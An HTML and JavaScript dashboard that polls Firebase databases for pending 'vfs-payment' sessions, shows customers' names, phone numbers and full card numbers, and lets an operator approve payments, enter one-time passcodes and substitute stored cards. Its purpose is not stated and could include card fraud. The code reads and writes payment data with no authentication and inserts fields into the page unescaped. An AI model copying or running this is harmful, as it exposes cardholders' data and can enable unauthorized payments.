<!DOCTYPE html>
<html>
  <head>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>

    <link
      href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css"
      rel="stylesheet"
      integrity="sha384-GLhlTQ8iRABdZLl6O3oVMWSktQOp6b7In1Zl3/Jr59b6EGGoI1aFkw7cmDA6j6gD"
      crossorigin="anonymous"
    />

    <script
      src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"
      integrity="sha384-w76AqPfDkMBDXo30jS1Sgez6pr3x5MlQ1ZAGC+nuZB+EYdgRZgiwxhTBTkF7CXvN"
      crossorigin="anonymous"
    ></script>

    <link
      href="//cdnjs.cloudflare.com/ajax/libs/x-editable/1.4.6/bootstrap-editable/css/bootstrap-editable.css"
      rel="stylesheet"
    />
    <script src="//cdnjs.cloudflare.com/ajax/libs/x-editable/1.4.6/bootstrap-editable/js/bootstrap-editable.min.js"></script>
  </head>
  <style>
    .table > tbody > tr > td {
      vertical-align: middle;
    }
  </style>
  <body>
    <button
      id="autorefresh"
      class="btn btn-primary"
      onclick="switch_tasks_interval()"
    >
      disable auto refresh
    </button>
    <table class="table table-striped table-dark">
      <thead>
        <tr>
          <th scope="col">#</th>
          <th scope="col">Name</th>
          <th scope="col">Mobile</th>
          <th scope="col">Client</th>
          <th scope="col">Page</th>
          <th scope="col">Card</th>
          <th scope="col">Since</th>
          <th scope="col">Status</th>
          <th scope="col">OTP</th>
          <th scope="col">Card</th>
          <th scope="col">Cancel</th>
          <th scope="col">Remove</th>
        </tr>
      </thead>
      <tbody></tbody>
    </table>

    <script>
      var cards = [];
      function get_payment_tasks() {
        $.ajax(
          "https://vfs-payment-default-rtdb.europe-west1.firebasedatabase.app/pending/.json",
          {
            method: "get",

            success: (data, text, xhr) => {
              let i = 1;
              $("tbody").html("");

              for (const id in data) {
                if(!data[id].info.applicationdata) {
                  console.log(`no application data for ${id}`);
                  continue;
                }
                let cardsHtml = `<option value=''>no db card used</option>`;

                for (const card of cards) {
                  cardsHtml += `<option value="${card.PAN}" ${
                    data[id].info.applicationdata.cib?.PAN == card.PAN
                      ? "selected"
                      : ""
                  }>${card.PAN.substring(12)} ${card.TEXT}</option>`;
                }

                $("tbody").append(`
                <tr>
    <th scope="row">${i++}</th>
    <td>${data[id].info.applicationdata.customers[0].FirstName} ${
                  data[id].info.applicationdata.customers[0].LastName
                }</td>
                <td>${data[id].info.applicationdata.customers[0].Mobile}</td>
                <td>${data[id].info.applicationdata.client || data[id].info.applicationdata.user}</td>
    <td>${data[id].info.location}</td>
    <td>${data[id].info.applicationdata.cib?.PAN}</td>
    <td>${(Date.now() - data[id].info.last_ping) / 1000}s</td>
    <td>${
      data[id].command?.pay
        ? `<button onclick='disallow_payment(${id})'  class='btn btn-success'>allowed</button>`
        : `<button onclick='allow_payment(${id})' class='btn btn-danger'>waiting</button>`
    }</td>

    <td><a href="#" onclick='update_otp(${id})' >${
                  data[id].command?.otp || "empty"
                }</a></td>


    <td>${data[id].info.applicationdata.date}</td>


    <td>
       <select class="form-control col-sm-1" onchange='update_card(${id}, this.value)' >
                ${cardsHtml}
              </select>
      </td>
    <td>
        <button onclick='cancel(${id})' class='btn btn-warning'>remove</button>
    </td>
    <td>
        <button onclick='remove(${id})' class='btn btn-secondary'>remove</button>
    </td>
</tr>

                `);
              }
            },
            error: (xhr, text, error) => {
              console.log(error);
            },
          }
        );
      }

      var payment_tasks_interval = setInterval(get_payment_tasks, 3000);
      setInterval(get_payment_cards, 3000);

      function switch_tasks_interval() {
        if (payment_tasks_interval) {
          clearInterval(payment_tasks_interval);
          payment_tasks_interval = undefined;
          document.querySelector("#autorefresh").innerText =
            "enable auto refresh";
          document.querySelector("#autorefresh").classList = "btn btn-warning";
        } else {
          payment_tasks_interval = setInterval(get_payment_tasks, 3000);
          document.querySelector("#autorefresh").innerText =
            "disable auto refresh";
          document.querySelector("#autorefresh").classList = "btn btn-primary";
          get_payment_tasks();
        }
      }

      get_payment_cards(true);

      function allow_payment(id) {
        $.ajax(
          `https://vfs-payment-default-rtdb.europe-west1.firebasedatabase.app/pending/${id}/command/.json`,
          {
            method: "patch",
            data: JSON.stringify({ pay: true }),
            success: () => get_payment_tasks(),
          }
        );
      }
      function disallow_payment(id) {
        $.ajax(
          `https://vfs-payment-default-rtdb.europe-west1.firebasedatabase.app/pending/${id}/command/.json`,
          {
            method: "patch",
            data: JSON.stringify({ pay: false }),
            success: () => get_payment_tasks(),
          }
        );
      }
      function update_otp(id) {
        let otp = prompt("enter otp:");
        $.ajax(
          `https://vfs-payment-default-rtdb.europe-west1.firebasedatabase.app/pending/${id}/command/.json`,
          {
            method: "patch",
            data: JSON.stringify({ otp: otp }),
            success: () => get_payment_tasks(),
          }
        );
      }

      function update_card(id, cardid) {
        const cardjson = cards.filter((e) => e.PAN == cardid)[0];

        $.ajax(
          `https://vfs-payment-default-rtdb.europe-west1.firebasedatabase.app/pending/${id}/card/.json`,
          {
            method: "patch",
            data: JSON.stringify(cardjson),
            success: () => {
              $("tbody").html("<tr><td>please wait...</td></tr>");
              setTimeout(get_payment_tasks, 1100);
            },
          }
        );
      }

      function cancel(id) {
        $.ajax(
          `https://vfs-payment-default-rtdb.europe-west1.firebasedatabase.app/pending/${id}/.json`,
          { method: "patch", success: () => {}, data: JSON.stringify({
            cancel: true
          })}
        );
      }

      function remove(id) {
        $.ajax(
          `https://vfs-payment-default-rtdb.europe-west1.firebasedatabase.app/pending/${id}/.json`,
          { method: "delete", success: () => get_payment_tasks() }
        );
      }
      async function get_payment_cards(get_tasks) {
        $.ajax(
          "https://payment-cards-default-rtdb.europe-west1.firebasedatabase.app/.json",
          {
            method: "get",

            success: (data, text, xhr) => {
              cards = [];
              for (const id in data) {
                cards.push(data[id]);
              }
              if (get_tasks) get_payment_tasks();
            },
            error: (xhr, text, error) => {
              console.log(error);
            },
          }
        );
      }
    </script>
  </body>
</html>
<!-- <tr>
    <th scope="row">1</th>
    <td>Mark</td>
    <td>Otto</td>
    <td>@mdo</td>
  </tr>
  <tr>
    <th scope="row">2</th>
    <td>Jacob</td>
    <td>Thornton</td>
    <td>@fat</td>
  </tr>
  <tr>
    <th scope="row">3</th>
    <td>Larry</td>
    <td>the Bird</td>
    <td>@twitter</td>
  </tr> -->
